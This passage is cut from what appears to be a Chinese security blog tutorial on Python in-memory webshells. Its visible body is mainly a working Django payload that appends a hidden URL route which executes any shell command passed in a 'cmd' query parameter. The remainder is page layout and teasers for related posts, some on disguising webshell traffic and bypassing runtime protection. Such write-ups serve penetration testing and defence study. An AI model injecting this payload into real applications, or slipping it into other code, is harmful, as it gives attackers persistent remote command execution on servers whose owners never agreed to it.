<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__import__(__import__(&#x27;django.conf&#x27;).conf.settings.ROOT_URLCONF).urls.urlpatterns.append(</span><br><span class="line">    __import__(&#x27;django&#x27;).urls.path(&#x27;nnn&#x27;, </span><br><span class="line">        lambda request: __import__(&#x27;django.http&#x27;).http.HttpResponse(</span><br><span class="line">            __import__(&#x27;subprocess&#x27;).check_output(</span><br><span class="line">                request.GET.get(&#x27;cmd&#x27;, &#x27;id&#x27;), shell=True)</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<hr>
<p>因为 SSTI 是好久前看的了，平常又不怎么用到，早就忘光光了，导致又花时间过了一遍基础</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io">ALe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io/2025/07/21/python%E5%86%85%E5%AD%98%E9%A9%AC/">https://ale1293528.github.io/2025/07/21/python%E5%86%85%E5%AD%98%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post-share"><div class="social-share" data-image="/img/anon2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/" title="ADS数据流实现隐藏文件"><img class="cover" src="/img/mygo1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">ADS数据流实现隐藏文件</div></div><div class="info-2"><div class="info-item-1">ADS：Alternate DataStreams，全称 NTFS 交换数据流，是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。简单来说，就是其他文件可以寄宿在某个文件身上。利用 ADS 数据流可以做很多有趣的事情 在NTFS分区创建ADS数据流文件有两种形式：  一是指定宿主文件； 二是创建单独的ADS文件。  创建的指令有两个：echo 和 type  echo 用于常规字符 type 用于将文件附加到某个文件  使用方法1. 使用宿主文件1echo test &gt; 1.txt:flag.txt 正常用 dir 是无法查看到的，可以使用 dir &#x2F;r 123456789101112131415161718192021222324C:\test&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 46BD-3363 C:\test 的目录2025/07/22  03:53    &lt;DIR&gt;          .2025/07/22  03:53    &lt;DIR&gt;          ..2025...</div></div></div></a><a class="pagination-related" href="/2025/07/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Bluecms/" title="代码审计-Bluecms"><img class="cover" src="/img/anon1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">代码审计-Bluecms</div></div><div class="info-2"><div class="info-item-1">著名开源 cms，也是有很多漏洞，正好拿来先练个手  用 phpstudy 先随便搭一个出来 先简单过一下目录结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748bluecms/├── admin/                     # 后台管理系统│   ├── config.inc.php         # 后台配置文件│   ├── index.php              # 后台登录入口│   ├── main.php               # 后台主界面│   ├── ...                    # 各种管理模块文件│├── api/                     	 # api接口│   ├── index.htm              # 防止目录浏览│   └── uc.php                 # 用户中心接口文件│├── data/                   ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/05/2021%20OWASP%20TOP%2010/" title="2021 OWASP TOP 10"><img class="cover" src="/img/anon3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-05</div><div class="info-item-2">2021 OWASP TOP 10</div></div><div class="info-2"><div class="info-item-1">近些年漏洞的威胁分类也发生了很大变化，王道SQL注入也慢慢淡出历史的舞台，最新OWASP Top Ten | OWASP Foundation版，分类和排名都变化了很多  [TOP1]失效的访问控制访问控制失效指的是：系统没有正确限制用户访问资源或功能，导致用户可以访问本不该访问的内容或操作 具体的例子：用户越权访问 用户 A 修改自己的资料：  1POST /api/user/update?id=1001   他把 ID 改成了管理员的 ID：  1POST /api/user/update?id=1   没有权限校验？那就直接修改管理员信息成功了  水平越权普通用户访问了其他用户的数据，比如： 1GET /api/orders/123456  → 返回了别人的订单信息（严重泄露） 垂直越权普通用户调用了管理员接口： 1POST /api/admin/delete_user?id=2  如果没检查角色权限，就能直接删号 前端控制误信前端隐藏了按钮，认为“用户就点不到”： 12&lt;!-- 管理员按钮 --&gt;&lt;button style=&quot;display: ...</div></div></div></a><a class="pagination-related" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" title="BehinderV4魔改"><img class="cover" src="/img/mygo3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-30</div><div class="info-item-2">BehinderV4魔改</div></div><div class="info-2"><div class="info-item-1">“冰蝎”(Behinder)是一个动态二进制加密网站管理客户端，相比较于传统的老牌工具“菜刀”而言，对webshell的流量进行了相应的加密。”冰蝎”客户端基于JAVA，所以可以跨平台使用，随着版本的升级，兼容性也随之提升。主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，功能非常强大，是现如今必不可少的渗透测试工具之一 如今借助大模型，ai 对流量中木马特征的监测已经越来越准确，可冰蝎早已不再更新，木马上传上去之间就落地成盒，所以我们要对冰蝎马在原本的基础上进行改造 冰蝎特征冰蝎有两个强特征，分别是  和数据包一大堆加密 如果这个数据包可以用冰蝎的传输协议解密，那就实锤为冰蝎马 除此之外还有数个弱特征例如 connection：keep-alive ，固定的 ua 头等 所以我们的魔改需要解决两个问题：  绕过识别（魔改打乱指纹信息） 绕过查杀（新增加密算法）  JAP 反编译打包构建https://www.decompiler.com/ 在这个网站在线反编译，然后下载下来（也可以用 jd-gui 工具反编译） 在 i...</div></div></div></a><a class="pagination-related" href="/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/" title="ADS数据流实现隐藏文件"><img class="cover" src="/img/mygo1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-24</div><div class="info-item-2">ADS数据流实现隐藏文件</div></div><div class="info-2"><div class="info-item-1">ADS：Alternate DataStreams，全称 NTFS 交换数据流，是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。简单来说，就是其他文件可以寄宿在某个文件身上。利用 ADS 数据流可以做很多有趣的事情 在NTFS分区创建ADS数据流文件有两种形式：  一是指定宿主文件； 二是创建单独的ADS文件。  创建的指令有两个：echo 和 type  echo 用于常规字符 type 用于将文件附加到某个文件  使用方法1. 使用宿主文件1echo test &gt; 1.txt:flag.txt 正常用 dir 是无法查看到的，可以使用 dir &#x2F;r 123456789101112131415161718192021222324C:\test&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 46BD-3363 C:\test 的目录2025/07/22  03:53    &lt;DIR&gt;          .2025/07/22  03:53    &lt;DIR&gt;          ..2025...</div></div></div></a><a class="pagination-related" href="/2025/08/21/Python-Bottle-SSTI/" title="Python Bottle SSTI"><img class="cover" src="/img/anon2.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-21</div><div class="info-item-2">Python Bottle SSTI</div></div><div class="info-2"><div class="info-item-1">XYCTF 中碰到的 Bottle 框架，当时做题根本没想到通过审计框架代码找漏洞点，也是学到新东西了  Bottle 简介Bottle 是一个 Python 的轻量级 Web 框架，完全依赖标准库（除了 wsgi 的部分），体积非常小（一个 .py 文件就能运行），适合写小型 Web 应用、API 或原型系统。它的设计理念是 “单文件、零依赖”，所以部署非常方便。 主要特点   特点 说明    单文件 框架代码就是一个 bottle.py 文件，方便直接打包或拷贝   零依赖 除了 Python 标准库外不需要额外安装其它库   内置开发服务器 用 run() 就能启动 HTTP 服务   支持多模板引擎 默认内置 SimpleTemplate，也支持 Jinja2、Mako 等   路由简洁 使用装饰器 @route() 定义 URL 对应的处理函数   WSGI兼容 可以在任何 WSGI 服务器（如 gunicorn、uWSGI）上部署   内置常用工具 请求&#x2F;响应处理、静态文件服务、Cookie、表单解析等   基本结构示例1234567from bottle...</div></div></div></a><a class="pagination-related" href="/2025/08/23/SQL%20to%20RCE/" title="SQL to RCE"><img class="cover" src="/img/mygo6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-23</div><div class="info-item-2">SQL to RCE</div></div><div class="info-2"><div class="info-item-1"> 有一些陈旧、庞大的系统中，因为一些复杂的原因，往往仍在使用 sa 账户登入 SQL Server，而在有如此高权限的资料库账户权限下，我们可以轻易利用 xp_cmdshell 来执行系统指令，但是这是几乎不可能的，我们取得的数据库账户必然是低权限，但因为发现的 SQL 注入是堆叠注入，我们仍然可以对表进行 CRUD，运气好可以控制一些网站设定变数的话，甚至可以直接 RCE  就比如我们可以发现某些特殊的数据库： 123456Database: ASPState[2 tables]+---------------------------------------+| dbo.ASPStateTempApplications          || dbo.ASPStateTempSessions              |+---------------------------------------+  这个数据库的存在用途是用来保存 ASP.NET 网站应用程式的 session。  在 ASP.NET 网站应用程式里，Session（会话数据，比如用户登录状态、购物车资料）...</div></div></div></a><a class="pagination-related" href="/2026/01/12/RASP%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E7%BB%95%E8%BF%87/" title="RASP的基础和绕过"><img class="cover" src="/img/mygo4.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-12</div><div class="info-item-2">RASP的基础和绕过</div></div><div class="info-2"><div class="info-item-1">什么是 RASPRASP，全称为 Runtime application self-protection，将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预 在攻防中，大部分都是基于流量规则的 waf 和态感，waf 误报率高，也容易被绕过，而且需要人工干预，而RASP技术防御是根据请求上下文进行拦截的，和 WAF 对比非常明显，我们用一个 sql 的攻击来举例 攻击者对http://xxx.com/index.do?id=1进行测试，一般情况会通过一些 sql 语句的拼接来验证是否有注入，这时会对 url 进行大量发包，如下： http://xxx.com/index.do?id=1' and 1&#x3D;2– 但是由于程序内部的过滤，实际执行的 sql 语句可能是这样： select id,name,age from home where id&#x3D;’1 &#39; and 1&#x3D;2–’ 对于 WAF 来说，只要你的流量包命中 ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ALe</div><div class="author-info-description">从渗透测试到网安烧烤的一生</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ALe1293528"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">恐惧扼住咽喉，如枷锁禁锢我的双臂 我向沉默发问，沉默却愈发震耳欲聋</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask"><span class="toc-number">1.</span> <span class="toc-text">Flask</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%EF%BC%88Flask-%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">内存马注入原理（Flask 路由机制）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%9C%BA%E5%88%B6%EF%BC%88Context%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">Flask 上下文机制（Context）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">漏洞环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E5%88%86%E8%A7%A3%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">步骤分解：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#url-for-globals"><span class="toc-number">2.1.1.</span> <span class="toc-text">url_for.__globals__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-eval-%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.2.</span> <span class="toc-text">执行 eval(...) 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E5%90%8E%E9%97%A8%E8%B7%AF%E7%94%B1-shell"><span class="toc-number">2.1.3.</span> <span class="toc-text">注册后门路由 &#x2F;shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django"><span class="toc-number">3.</span> <span class="toc-text">Django</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/12/RASP%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E7%BB%95%E8%BF%87/" title="RASP的基础和绕过"><img src="/img/mygo4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RASP的基础和绕过"/></a><div class="content"><a class="title" href="/2026/01/12/RASP%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E7%BB%95%E8%BF%87/" title="RASP的基础和绕过">RASP的基础和绕过</a><time datetime="2026-01-12T08:47:06.000Z" title="Created 2026-01-12 16:47:06">2026-01-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/30/%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%8B%E8%BF%87%EF%BC%88Zip-Slip%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4-Python-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="文件解压之过（Zip Slip）漏洞导致 Python 代码执行"><img src="/img/mygo1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件解压之过（Zip Slip）漏洞导致 Python 代码执行"/></a><div class="content"><a class="title" href="/2025/11/30/%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%8B%E8%BF%87%EF%BC%88Zip-Slip%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4-Python-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="文件解压之过（Zip Slip）漏洞导致 Python 代码执行">文件解压之过（Zip Slip）漏洞导致 Python 代码执行</a><time datetime="2025-11-30T03:58:13.000Z" title="Created 2025-11-30 11:58:13">2025-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" title="BehinderV4魔改"><img src="/img/mygo3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BehinderV4魔改"/></a><div class="content"><a class="title" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" title="BehinderV4魔改">BehinderV4魔改</a><time datetime="2025-10-30T12:38:13.000Z" title="Created 2025-10-30 20:38:13">2025-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/26/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B/" title="Python多线程"><img src="/img/mygo6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python多线程"/></a><div class="content"><a class="title" href="/2025/10/26/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B/" title="Python多线程">Python多线程</a><time datetime="2025-10-26T13:23:24.000Z" title="Created 2025-10-26 21:23:24">2025-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/17/Docker%E5%9F%BA%E7%A1%80/" title="Docker基础"><img src="/img/mygo5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker基础"/></a><div class="content"><a class="title" href="/2025/10/17/Docker%E5%9F%BA%E7%A1%80/" title="Docker基础">Docker基础</a><time datetime="2025-10-17T08:01:55.000Z" title="Created 2025-10-17 16:01:55">2025-10-17</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By ALe</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>